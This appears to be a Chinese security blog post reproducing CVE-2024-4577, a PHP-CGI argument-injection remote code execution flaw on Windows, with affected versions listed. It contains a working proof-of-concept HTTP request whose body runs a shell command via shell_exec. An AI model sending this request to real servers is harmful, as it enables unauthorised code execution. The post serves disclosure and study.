#  【漏洞复现】PHP CGI参数注入RCE漏洞(CVE-2024-4577)   
YGnight  night安全   2024-06-09 10:43  
  
公众号新规  
只对常读  
和  
星标的公众号才能展示大图推送，  
建议大家把公众号“  
n  
i  
g  
h  
t  
安  
全”设为  
星  
标，  
否  
则  
可  
能  
就  
看  
不  
到  
啦  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6sHg0pvRw6MpQSvVF3CeJ83RS0Ys1YBXC1vM6icvsxKialdwur2lAFAsQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6kXG7JA6Rbic2FFaqy9dPWrQlwfRNCPfyicibm6Evv39Z6VttiagBARRQgw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif "")  
  
  
  
night安全致力于分享技术学习和工具掌握。然而请注意不得将此用于任何未经授权的非法行为，请您严格遵守国家信息安全法律法规。任何违反法律、法规的行为，均与本人无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
PHP程序语言在设计时忽略Windows操作系统内部对字元编码转换的Best-Fit特性，导致未认证的攻击者可透过特定的字元序列绕过旧有CVE-2012-1823的保护；透过参数注入等攻击在远端PHP服务器上执行任意代码。  
  
建站集成软件包XAMMP Windows版本（使用语系为繁体中文950、日文932、简体中文936）默认配置下受该漏洞影响。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
  
PHP 8.3 < 8.3.8PHP 8.2 < 8.2.20PHP 8.1 < 8.1.29  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
POC：  
```
GET /test.php?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp://input HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 31

<?php echo shell_exec('dir');?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqgrl0hg3DprTH66IljPBvXZibm5axqLSjQ8EA1a9N0k8Td4Hgc16VBLj8LpFwEQXlyvWThQOJTKcibg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKpciaqHNr4Y60SPF1XeS358wiceQDUm8K5zh7RZsnknYxKJ37kkkcpWZg/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhia1cXxs2MiaTdgf2bBwXka6DCLEF53OGJWH7A9YU8LA95g10yEzvZgFYhwhV3OQX3qdtk7vIsWncw/640?wx_fmt=png&from=appmsg "")  
  
****  
扫  
码  
关  
注  
  
获  
得  
更  
多  
资  
讯  
  
****  
  
